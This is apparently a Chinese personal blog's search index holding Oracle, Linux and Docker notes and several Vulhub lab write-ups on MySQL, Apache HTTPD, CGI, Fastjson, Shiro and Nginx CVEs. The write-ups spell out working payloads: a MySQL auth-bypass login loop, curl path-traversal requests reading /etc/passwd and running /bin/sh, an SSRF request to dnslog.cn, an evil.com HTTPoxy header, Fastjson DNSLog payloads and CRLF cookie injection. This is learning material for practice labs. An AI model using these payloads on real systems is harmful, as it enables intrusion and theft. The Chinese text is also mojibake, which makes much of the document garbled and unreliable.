å°†xxxè½¬åŒ–ä¸ºæŒ‡å®štypeå¸¸é‡ã€‚&lt;xxx&gt;as&lt;yyy&gt; ï¼š ä»¥yyyçš„ç»“æœå®šä¹‰xxxã€‚$ ï¼š å¼•ç”¨å¸¸é‡ã€‚$$ ï¼š åŒ…è£¹å‡½æ•°ä¸»ä½“ã€‚volatile ï¼š volatileæŒ‡å‡½æ•°å¯ä»¥ä¿®æ”¹æ•°æ®åº“, å‡½æ•°å‚æ•°å€¼ç›¸åŒçš„æƒ…å†µä¸‹, å¯ä»¥è¿”å›ä¸åŒçš„ç»“æœ, æ‰€ä»¥volatileå‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼˜åŒ–å™¨å¯¹å®ƒçš„å¤„ç†æ˜¯æ¯ä¸€è¡Œéƒ½éœ€è¦æ‰§è¡Œä¸€æ¬¡volatileå‡½æ•°ã€‚\n\nOracleDB(:1521)æŠ¥é”™\nQ1.è¿œç¨‹è¿æ¥æ•°æ®åº“æç¤ºæœªç›‘å¬ï¼š\nORA-12541:TNS:no listener\nA1.æœªå¯åŠ¨æ•°æ®åº“ç›‘å¬ï¼š\n[oracle@localhost ~]$ lsnrctl status //æŸ¥è¯¢\n[oracle@localhost ~]$ lsnrctl start //å¯åŠ¨\nQ2.è¿œç¨‹è¿æ¥æ•°æ®åº“æç¤ºä¸çŸ¥åæœåŠ¡\nORA-12514: TNS:listener does not currently know of service requested in connect descriptor\nA2.ç›‘å¬å¯åŠ¨äº†ä½†æ•°æ®åº“æœªå¯åŠ¨\n[oracle@localhost ~]$ sqlplus / as sysdba\nSQL> startup\nORACLE instance started.\nQ3.ç™»å½•æç¤ºè¿æ¥åˆ°ç©ºé—²å®ä¾‹ï¼š\nSQL> conn / as sysdba\nConnected to an idle instance.\nA3.æœªå¯åŠ¨æ•°æ®åº“ï¼š\nSQL> startup\nORACLE instance started. //å¯åŠ¨\n\nç™»å½•OracleDB\n[oracle@localhost ~]$ sqlplus / as sysdba;\n**=**\n[oracle@localhost ~]$ sqlplus /nolog  //è¿æ¥æ•°æ®åº“æš‚ä¸ç™»å½•\nSQL> conn / as sysdba;\n\næŸ¥è¯¢æŸè§’è‰²å…·æœ‰çš„æƒé™ï¼ˆä»¥DBAä¸ºä¾‹ï¼‰\nselect * from role_tab_privs where role = 'DBA'; --æŸ¥è¯¢è§’è‰²DBAå…·æœ‰çš„å¯¹è±¡æƒé™ï¼ˆå¯¹è±¡æƒé™èµ‹äºˆè§’è‰²ï¼‰\nselect * from role_sys_privs where role = 'DBA'; --æŸ¥è¯¢è§’è‰²DBAå…·æœ‰çš„ç³»ç»Ÿæƒé™ï¼ˆç³»ç»Ÿæƒé™èµ‹äºˆè§’è‰²ï¼‰\nselect * from role_role_privs where role = 'DBA'; --æŸ¥è¯¢è§’è‰²DBAå…·æœ‰çš„è§’è‰²ï¼ˆè§’è‰²èµ‹äºˆè§’è‰²ï¼‰\n\næŸ¥è¯¢ç”¨æˆ·è´¦æˆ·å…·æœ‰çš„æƒé™ï¼ˆä»¥SYSä¸ºä¾‹ï¼‰\nselect * from DBA_tab_privs where GRANTEE = 'SYS';\nselect * from DBA_role_privs where GRANTEE = 'DBA';\nselect * from DBA_sys_privs where GRANTEE = 'DBA';\n\nROLE_TAB_PRIVSROLE_TAB_PRIVS describes table privileges granted to roles. Information is provided only about roles to which the user has access.\n","categories":["SQL"],"tags":["SQL"]},{"title":"Vulhub|MySQLé›†åˆ","url":"/7b78999f.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Mysql èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2012-2122ï¼‰å½±å“ç‰ˆæœ¬ :     MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.    MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.Vul : èº«ä»½è®¤è¯ç»•è¿‡Path :mysql/CVE-2012-2122Breakthroughï¼š  \n\nå½“è¿æ¥MariaDB/MySQLæ—¶ï¼Œè¾“å…¥çš„å¯†ç ä¼šä¸æœŸæœ›çš„æ­£ç¡®å¯†ç æ¯”è¾ƒï¼Œç”±äºä¸æ­£ç¡®çš„å¤„ç†ï¼Œä¼šå¯¼è‡´å³ä¾¿æ˜¯memcmp()è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œä¹Ÿä¼šä½¿MySQLè®¤ä¸ºä¸¤ä¸ªå¯†ç æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦çŸ¥é“ç”¨æˆ·åï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚for i in `seq 1 1000`; do mysql -uroot -pwrong -h &lt;sqlæœåŠ¡å™¨ip> -P&lt;port> ; done\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","MySQL"]},{"title":"Vulhub|CGIé›†åˆ","url":"/9f24c7bd.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.HTTPoxyæ¼æ´ï¼ˆCVE-2016-5385ï¼‰Path : cgi/httproxyVul : HTTProxyBreakthroughï¼š  \n\næ ¹æ®RFC 3875è§„å®šï¼ŒCGIï¼ˆfastcgiï¼‰è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰HTTPå¤´éƒ½åŠ ä¸ŠHTTP_å‰ç¼€æ”¾å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œæ°å¥½å¤§å¤šæ•°ç±»åº“çº¦å®šä¿—æˆä¼šæå–ç¯å¢ƒå˜é‡ä¸­çš„HTTP_PROXYå€¼ä½œä¸ºHTTPä»£ç†åœ°å€ã€‚äºæ˜¯ï¼Œæ¶æ„ç”¨æˆ·é€šè¿‡æäº¤Proxy: http://evil.comè¿™æ ·çš„HTTPå¤´ï¼Œå°†ä½¿ç”¨ç¼ºé™·ç±»åº“çš„ç½‘ç«™çš„ä»£ç†è®¾ç½®ä¸ºhttp://evil.comï¼Œè¿›è€Œçªƒå–æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ã€‚æ­£å¸¸è¯·æ±‚ï¼Œorigin å‚æ•°ä¸ºå½“å‰å‘èµ·è¯·æ±‚çš„æœåŠ¡å™¨ã€‚æ„é€ è¯·æ±‚ï¼Œåœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥ Proxy: http://&lt;ip&gt;:&lt;port&gt;ï¼Œå¹¶åœ¨ &lt;ip&gt; æ‰€åœ¨ä¸»æœºä½¿ç”¨ nc -l -p &lt;port&gt; ç›‘å¬ä»£ç†ç«¯å£ï¼Œå‘é€è¯·æ±‚ï¼Œç›‘å¬åˆ°è¯·æ±‚æŠ¥æ–‡ã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","CGI","HTTProxy"]},{"title":"Vulhub|HTTPDé›†åˆ","url":"/2ba89e8d.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰å½±å“ç‰ˆæœ¬ : Apache HTTPD 2.4.0 - 2.4.29Path : httpd/CVE-2017-15715Vul : æ–‡ä»¶ä¸Šä¼ Breakthroughï¼š  \n\n&lt;FilesMatch \".+\\.ph(p[3457]?|t|tml)$\">\n\næ­£åˆ™è¡¨è¾¾å¼å®šä½ç¬¦$ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾çš„ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ è¿˜ä¼šä¸ \\n æˆ– \\r ä¹‹å‰çš„ä½ç½®åŒ¹é…ã€‚  \n\næ•…æ­¤å¤„å¯é€šè¿‡æ–‡ä»¶ååç¼€ &lt;file_name&gt;.php%0aï¼Œè¿›è¡Œå¯¹.phpæ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„ç»•è¿‡å¹¶æˆåŠŸå½“ä½œ.phpæ–‡ä»¶è§£æã€‚è®¿é—® http://:/&lt;file_name&gt;.php%0a èƒ½å¤ŸæˆåŠŸè®¿é—®è§£æäº†æ–‡ä»¶ä¸­phpç¨‹åºçš„é¡µé¢ï¼ˆå¿…é¡»å¸¦ä¸Š%0aï¼Œå¦åˆ™æ–‡ä»¶ä¸å­˜åœ¨ï¼‰ã€‚  \n\nQï¼šä¸ºä»€ä¹ˆ .php%0d æˆ– .php%0a%0d æˆ– %.php%0d%0a èƒ½å¤Ÿç»•è¿‡ä¸Šä¼ ï¼Œä½†æ— æ³•æˆåŠŸè§£æphpï¼ŸAï¼šâ€œå¯èƒ½æ˜¯å› ä¸ºè§£æä»£ç ä¸­å¯¹%0dè¿›è¡Œäº†å¤„ç†â€    \nä¸Nginx Insecure-configurationä¸­çš„CRLFæ³¨å…¥æ¼æ´ï¼ˆHRSï¼‰ç›¸ä¼¼ã€‚  \n\n\n2.Apache HTTP Server 2.4.48 mod_proxy SSRFæ¼æ´ï¼ˆCVE-2021-40438ï¼‰å½±å“ç‰ˆæœ¬ : Apache HTTPD â‰¤ 2.4.48Path : httpd/CVE-2021-40438Vul : SSRFBreakthroughï¼š  \n\nSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å…¬ç½‘æ— æ³•ç›´æ¥è®¿é—®çš„å†…ç½‘åç«¯æœåŠ¡å™¨ã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±åä»£æœåŠ¡å™¨å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸åä»£æœåŠ¡å™¨ç›¸è¿è€Œä¸å…¬ç½‘éš”ç¦»çš„å†…ç½‘åç«¯æœåŠ¡å™¨ï¼‰SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–åç«¯æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚Apacheåœ¨é…ç½®åä»£çš„åç«¯æœåŠ¡å™¨æ—¶ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š  \n\nç›´æ¥ä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°æŸä¸ªIPå’Œç«¯å£ï¼Œæ¯”å¦‚ ProxyPass / â€œhttp://localhost:8080&quot; \nä½¿ç”¨æŸä¸ªåè®®åä»£åˆ°unixå¥—æ¥å­—ï¼Œæ¯”å¦‚ ProxyPass / â€œunix:/var/run/www.sock|http://localhost:8080/&quot;  \n\nç›®çš„æ˜¯è®¿é—®åç«¯æœåŠ¡å™¨ï¼Œæ•…ä¸èƒ½è®©åä»£æœåŠ¡å™¨æŠŠè¯·æ±‚å‘é€åˆ°unixå¥—æ¥å­—ä¸Šï¼Œè€Œæ˜¯å‘é€ç»™æˆ‘ä»¬éœ€è¦çš„ | åé¢çš„åœ°å€ã€‚ä¸ºäº†ä½¿å‰æ®µå¥—æ¥å­—è¿”å›nullï¼Œéœ€ä½¿å…¶ ï¼ˆé•¿åº¦+4ï¼‰ ï¼ ï¼ˆAPR_PATH_MAX=4096ï¼‰ï¼Œå¯æ„é€ è¯·æ±‚ï¼šGET /?unix:&#123;A*4096&#125;|http://dnslog.cn/ HTTP/1.1\nHost: 192.168.1.162:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\n\n3.Apache HTTP Server è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2021-41773ã€CVE-2021-42013ï¼‰å½±å“ç‰ˆæœ¬ : Apache HTTPD 2.4.49 - 2.4.50Path : httpd/CVE-2021-41773ã€CVE-2021-42013Vul : ç›®å½•ç©¿è¶ŠBreakthroughï¼š  \n\n// /icons/å¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•\ncurl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n// æœåŠ¡ç«¯å¼€å¯äº†cgiæˆ–cgidè¿™ä¸¤ä¸ªmod\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'\n// Apache HTTPD 2.4.50\ncurl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'\n\n4.Apache HTTPD å¤šåç¼€è§£ææ¼æ´Path : httpd/apache_parsing_vulnerabilityVul : æ–‡ä»¶ä¸Šä¼ Breakthroughï¼š  \n\nApache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚è‹¥ç®¡ç†äººå‘˜ç»™.phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼šAddHandler application/x-httpd-php .phpé‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚å°†å†™æœ‰phpç¨‹åºçš„æ–‡ä»¶åç¼€æ”¹ä¸º.php.jpg æˆ– .php.jpeg å³å¯ç»•è¿‡ä¸Šä¼ ã€‚  \n\n5.Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´Path : httpd/ssi-rceVul : æ–‡ä»¶ä¸Šä¼ Breakthroughï¼š  \n\nç›®æ ‡æœåŠ¡ç«¯å¯èƒ½ä¸å…è®¸ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨ &lt;!--#exec cmd=&quot;id&quot; --&gt; è¯­æ³•æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè¿”å›å‘½ä»¤æ‰§è¡Œç»“æœã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Httpd","æ–‡ä»¶ä¸Šä¼ ","SSRF","ç›®å½•ç©¿è¶Š"]},{"title":"Linux|å‘½ä»¤é›†åˆ","url":"/88fdf392.html","content":"ç³»ç»Ÿå‘½ä»¤\nsu ï¼š ä»…åˆ‡æ¢èº«ä»½ã€‚su - ï¼š èº«ä»½ä¸$PATHå·¥ä½œè·¯å¾„éƒ½åˆ‡æ¢ã€‚su å’Œ su- æœ€å¤§çš„æœ¬è´¨åŒºåˆ«å°±æ˜¯ï¼šå‰è€…åªæ˜¯åˆ‡æ¢äº†rootèº«ä»½ï¼Œä½†Shellç¯å¢ƒä»ç„¶æ˜¯æ™®é€šç”¨æˆ·çš„Shellï¼›è€Œåè€…è¿ç”¨æˆ·å’ŒShellç¯å¢ƒä¸€èµ·åˆ‡æ¢æˆrootèº«ä»½äº†ã€‚ï¼ˆå¯é€šè¿‡pwd å’Œ $PATH æŸ¥çœ‹åŒºåˆ«ï¼‰\n\nDocker\n// æŸ¥çœ‹ docker å®ˆæŠ¤è¿›ç¨‹è¿è¡ŒçŠ¶æ€  \nservice docker status  \n\n// å¯åŠ¨/å…³é—­/é‡å¯ docker å®ˆæŠ¤è¿›ç¨‹\nservice docker start/stop/restart  \n\n// è¿”å›æ‰€æœ‰å®¹å™¨å’Œé•œåƒçš„æ•°é‡ã€dockerä½¿ç”¨çš„æ‰§è¡Œç¨‹åºå’Œå­˜å‚¨é©±åŠ¨ï¼Œä»¥åŠdockerçš„åŸºæœ¬é…ç½®ä¿¡æ¯  \ndocker info  \n\n// æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨  \ndocker ps  \ndocker container ls  \n\n// æ˜¾ç¤ºå·²å®‰è£…çš„å®¹å™¨\ndocker ps -a\n\n// æŸ¥çœ‹æŸå®¹å™¨æ‰€æœ‰çŠ¶æ€ä¿¡æ¯(ip...)\ndocker inspect [docker_name æˆ– docker_id]\n\n// åœ¨å·²ç»å¯åŠ¨çš„å®¹å™¨å†…éƒ¨è¿è¡Œè¿›ç¨‹  \ndocker exec -it [docker_name æˆ– docker_id] /bin/bash //åˆ›å»ºttyç»ˆç«¯ï¼Œæ•æ‰STDINï¼Œåœ¨å®¹å™¨å†…å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤  \ndocker exec -d docker_name/docker_id touch /home/test.txt //-dè¡¨ç¤ºåå°è¿›ç¨‹ï¼Œåœ¨æŒ‡å®šå®¹å™¨ä¸­è¿è¡Œä¸€ä¸ªåå°è¿›ç¨‹'touch /home/test.txt'\n\nJava\n// åˆ‡æ¢javaç‰ˆæœ¬  \nupdate-alternatives --config java\n\n// è®¾ç½®javaç‰ˆæœ¬ä¼˜å…ˆçº§  \nupdate-alternatives --install /usr/bin/java java /usr/local/java/jdk1.8.0_311/bin/java 1110    \n\n","categories":["Linux"],"tags":["Linux"]},{"title":"Vulhub|Fastjsoné›†åˆ","url":"/32c50423.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Fastjson ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´å½±å“ç‰ˆæœ¬ : Fastjson xPath : fastjson/1.2.24-rce ã€ 1.2.47-rceVul : ååºåˆ—åŒ–Breakthroughï¼š  \n\né€šè¿‡DNSLogå¯¹å„ç‰ˆæœ¬Fastjsonååºåˆ—åŒ–æ¼æ´è¿›è¡ŒéªŒè¯çš„payloadï¼šx &lt; 1.2.67\n&#123;\"zeo\":&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"3xho90.dnslog.cn\"&#125;&#125;\nx >= 1.2.67\n&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.cn\"&#125;\n&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog.cn\"&#125;\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Fastjson","ååºåˆ—åŒ–"]},{"title":"Vulhub|Shiroé›†åˆ","url":"/7d27907c.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰å½±å“ç‰ˆæœ¬ : Shiro &lt; 1.2.4Path : shiro/CVE-2016-4437Vul : ååºåˆ—åŒ–æ¼æ´Breakthroughï¼š  \n\nå“åº”å¤´ä¸­å«æœ‰ â€œrememberMe=deleteMeâ€ ï¼šShiroååºåˆ—åŒ–æ¼æ´çš„æ ‡å¿—ã€‚ä½¿ç”¨æ¼æ´æ£€æµ‹å·¥å…· ShiroExploit + ncç›‘å¬ åå¼¹shellè‡³æ”»å‡»æœºã€‚  \n\n2.Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957)å½±å“ç‰ˆæœ¬ : Shiro &lt; 1.5.1Path : shiro/CVE-2020-1957Vul : è®¤è¯ç»•è¿‡Breakthroughï¼š  \n\n@Bean\npublic ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;  \n   DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();  \n   chainDefinition.addPathDefinition(\"/login.html\", \"authc\"); // need to accept POSTs from the login form  \n   chainDefinition.addPathDefinition(\"/logout\", \"logout\");  \n   chainDefinition.addPathDefinition(\"/admin/**\", \"authc\");  \n   return chainDefinition;  \n&#125;  \n\n\nç›´æ¥è®¿é—®ç®¡ç†é¡µé¢ /admin/ ï¼Œé‡å®šå‘åˆ°ç™»é™†ç•Œé¢ login.htmlã€‚æ„é€  /xxx/..;/admin/ ï¼Œç»•è¿‡æƒé™æ ¡éªŒï¼Œè®¿é—®åˆ°ç®¡ç†é¡µé¢ã€‚URLè¯·æ±‚è¿‡ç¨‹ï¼š  \n\nå®¢æˆ·ç«¯è¯·æ±‚URL: /xxx/..;/admin/  \nShrio å†…éƒ¨å¤„ç†å¾—åˆ°æ ¡éªŒURLä¸º /xxx/..,æ ¡éªŒé€šè¿‡  \nSpringBoot å¤„ç† /xxx/..;/admin/ , æœ€ç»ˆè¯·æ±‚ /admin/, æˆåŠŸè®¿é—®äº†åå°è¯·æ±‚  \n\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Shiro"]},{"title":"Vulhub|Nginxé›†åˆ","url":"/5821439b.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰å½±å“ç‰ˆæœ¬ : Nginx 0.8.41-1.4.3 / 1.5.0-1.5.7Vul : æ–‡ä»¶ä¸Šä¼ Path :nginx/CVE-2013-4547Breakthroughï¼š  \n\nï¼ˆaï¼‰å°†å†™æœ‰phpä»£ç çš„æ–‡ä»¶ä¿å­˜ä¸º .jpgæ ¼å¼ â€“ ä¸Šä¼ æ–‡ä»¶ â€“ è®¿é—® /&lt;_name&gt;.jpg â€“ æ˜¾ç¤ºå­˜åœ¨æ–‡ä»¶ï¼ˆbï¼‰Nginxä¼šåŒ¹é…æ­£åˆ™\\.php$ï¼Œè‹¥åŒ¹é…ä¸Šåˆ™è¿›å…¥fastcgiå¤„ç† â€“ è®¿é—® /&lt;_name&gt;.jpg.phpï¼ˆå¸Œæœ›æœåŠ¡å™¨è§£ææ–‡ä»¶ä¸­çš„phpä»£ç ï¼‰ â€“ è¿”å›æ–‡ä»¶ä¸å­˜åœ¨ï¼ˆæ²¡æœ‰è§£æåˆ°ï¼‰ï¼ˆcï¼‰è®¿é—® /&lt;_name&gt;.jpg.php â€“ bpæ‹¦æˆªï¼Œä½¿ç”¨00æˆªæ–­ï¼ˆåœ¨.phpå‰æ’å…¥HexCode[00]ï¼‰ â€“ è¿”å›æ•°æ®ä¸ºç©ºï¼ˆè¿˜æ˜¯æ²¡æœ‰è§£æåˆ°ï¼‰ï¼ˆdï¼‰CVE-2013-4547ï¼šNginxå¦‚æœå‘ç°URIä¸­å­˜åœ¨ç©ºæ ¼[20]å°±ä¼šç»§ç»­å¤„ç†URIä¸­çš„å‰©ä½™éƒ¨åˆ†ï¼Œè¿™è¯´æ˜äº†å¦‚æœç©ºæ ¼å’Œæˆªæ–­ç¬¦ç›¸é‚»[20][00]ï¼Œnginxå°±ä¸ä¼šæ£€æµ‹åˆ°00æˆªæ–­ï¼Œä»è€Œå¯ä»¥æ­£å¸¸ä½¿ç”¨00æˆªæ–­ã€‚ç”±äº00æˆªæ–­fastcgiå®é™…å¤„ç†çš„æ–‡ä»¶ä¸º&lt;_name&gt;.jpg[20]ï¼Œåˆå› ç³»ç»Ÿä¼šè‡ªåŠ¨å°†æ–‡ä»¶åç¼€æœ«å°¾å­˜åœ¨ç©ºæ ¼[20]ä¿®å¤ä¸º&lt;_name&gt;.jpgã€‚ï¼ˆeï¼‰ä¸Šä¼ å†™æœ‰phpä»£ç çš„ .jpg[20]æ–‡ä»¶ â€“ è®¿é—® /&lt;_name&gt;.jpg â€“ bpæ‹¦æˆª â€“ å°†uriå‚æ•°ä¿®æ”¹ä¸º /uploadfiles/&lt;_name&gt;.jpg[20][00].php â€“ é‡æ”¾ï¼Œå“åº”200 OKï¼ˆæ­¤æ—¶åº”è§£ææˆåŠŸä¸Šä¼ æ–‡ä»¶ä¸­çš„phpä»£ç ï¼‰ â€“ å¯å°è¯•èšå‰‘è¿æ¥éªŒè¯  \n\n2.Nginx æ•´æ•°æº¢å‡º/è¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ï¼ˆCVE-2017-7529ï¼‰å½±å“ç‰ˆæœ¬ : Nginx 0.5.6-1.13.2Vul : æ•°æ®æ³„æ¼Path :nginx/CVE-2017-7529Breakthroughï¼š  \n\n\nnginxå¯ä»¥å½“ä½œä¸€ä¸ªç¼“å­˜æœåŠ¡å™¨ï¼Œå°†webæœåŠ¡å™¨çš„å†…å®¹ä¿å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œ å¦‚æœå®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹å·²ç»æœ‰ç¼“å­˜äº†ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†ç¼“å­˜å†…å®¹è¿”å›ï¼Œå°±éœ€è¦å†æ¬¡è¯·æ±‚æœåŠ¡å™¨äº†ï¼Œå¯é™ä½åº”ç”¨æœåŠ¡å™¨çš„è´Ÿè½½ã€‚  \nCVE-2017-7529ï¼šè¯·æ±‚ä¸­åŒ…å«rangeå¤´æ—¶ï¼ŒNginxä¼šæ ¹æ®æŒ‡å®šrang1å’Œrang2çš„ä½ç½®è¿”å›æŒ‡å®šé•¿åº¦çš„å†…å®¹ï¼Œè‹¥éé¦–æ¬¡çš„è¯·æ±‚rangeå‘½ä¸­äº†ç¼“å­˜æ–‡ä»¶ é‡å¤è¯·æ±‚è¯»å–ä¿¡æ¯æ˜¯ä»ç¼“å­˜ä¸­è¯»å–çš„ï¼Œä¿®æ”¹è¯·æ±‚ä¸­çš„è´Ÿæ•°åç§»é‡rangeçš„èŒƒå›´ï¼Œå³å¯å®šä½è¯»å–åˆ°ç¼“å­˜ä¸­çš„æ•æ„Ÿæ•°æ®ï¼ˆåŸæœ¬å¹¶ä¸ä¼šè¿”å›çš„ï¼‰  \n\nï¼ˆaï¼‰é‡å¤è®¿é—®192.168.x.x:8080ï¼Œcurl -i 192.168.x.x:8080 â€“ è¿”å›çš„å“åº”ä¸­X-Proxy-Cacheï¼šHITè¯´æ˜éé¦–æ¬¡è®¿é—®ï¼ˆé¦–æ¬¡æ˜¯MISSï¼‰ä¸”Content-Lengthï¼š612ï¼ˆbï¼‰è®¡ç®—rangeï¼š\n\n\n\nrange\nå…¬å¼\nè®¡ç®—æ–¹æ³•\n\n\n\n\nrange1\nrange1 = ContentLength + 605(â†‘)\nä¸ºäº†å‘å‰è¯»å–æ•°æ®ï¼Œå·®å€¼æœ€å¥½ä¿æŒåœ¨605+\n\n\nrange2\nrange2 = 8000000000000000 - range1\næ€»å€¼0x8000000000000000å‡å»rang1\n\n\n\nï¼ˆcï¼‰æ•…è¯¥è¯·æ±‚éœ€æ„é€ ä¸ºcurl -i http://192.168.x.x:8080/ -r -1217,-7999999999998783 â€“ è¿™é‡Œæˆ‘æ‰‹åŠ¨å¤ç°ä¸å‡ºæ¥ â€“ ä½¿ç”¨é¶åœºç¯å¢ƒè‡ªå¸¦çš„poc.pyèƒ½å¤Ÿå¤ç°è¯¥æ¼æ´  \n\n3.Nginx Insecure-configurationVul : CRLFæ³¨å…¥(HRS)ã€ç›®å½•ç©¿è¶Šã€add_headerå¤±æ•ˆPath :nginx/insecure-configurationBreakthroughï¼š\nCRLFæ³¨å…¥æ¼æ´ï¼ˆHRSï¼‰  \n\né”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼šlocation / &#123;  \n   return 302 https://$host$uri; //ï¼ˆåŸæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†è®©httpçš„è¯·æ±‚è·³è½¬åˆ°httpsä¸Šï¼‰  \n&#125;  Nginxä¼šå°†$uriè¿›è¡Œè§£ç ï¼Œå¯¼è‡´ä¼ å…¥%0a%0då³å¯å¼•å…¥æ¢è¡Œç¬¦ï¼Œé€ æˆCRLFæ³¨å…¥æ¼æ´ã€‚ï¼ˆaï¼‰payload http://192.168.x.x:8080/%0a%0dSet-Cookie:%20a=1 //æ³¨å…¥Set-Cookieå¤´ï¼Œè®¾ç½®äº†ä¸€ä¸ªSESSIONï¼Œé€ æˆä¸€ä¸ªä¼šè¯å›ºå®šæ¼æ´ï¼ˆbï¼‰payload 